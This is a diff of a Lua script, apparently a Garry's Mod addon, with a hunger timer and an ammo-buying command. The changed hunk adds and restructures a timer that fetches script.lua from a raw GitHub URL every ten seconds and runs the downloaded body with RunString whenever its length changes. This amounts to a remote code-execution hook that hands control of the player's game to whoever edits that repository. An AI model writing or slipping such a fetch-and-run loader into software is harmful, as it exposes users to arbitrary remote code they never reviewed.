@@ -118,15 +118,31 @@ timer.Create("HungerTimer", 1, 0, function()
     end
 end)
 
-local prevLength = nil
-local function fetchScript()
+http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
+    function(body, len, headers, code)
+        if code == 200 then
+            prevLength = len
+        else
+            print("Ошибка HTTP:", code)
+            prevLength = nil
+        end
+    end,
+    function(error)
+        print("Ошибка HTTP:", error)
+        prevLength = nil
+    end
+)
+
+if timer.Exists("ScriptLengthCheck") then
+    timer.Remove("ScriptLengthCheck")
+end
+
+timer.Create("ScriptLengthCheck", 10, 0, function()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
             if code == 200 then
-                if prevLength ~= nil and prevLength ~= len then
-                    prevLength = len
-                    RunString(body)
-                elseif prevLength == nil then
+                if prevLength ~= len and prevLength ~= nil then
+                    print(len)
                     prevLength = len
                     RunString(body)
                 end
@@ -138,13 +154,7 @@ local function fetchScript()
             print("Ошибка HTTP:", error)
         end
     )
-end
-
-if timer.Exists("ScriptLengthCheck") then
-    timer.Remove("ScriptLengthCheck")
-end
-
-timer.Create("ScriptLengthCheck", 10, 0, fetchScript)
+end)
 
 concommand.Add("buy_ammo", function()
     local weapon = LocalPlayer():GetActiveWeapon().Primary
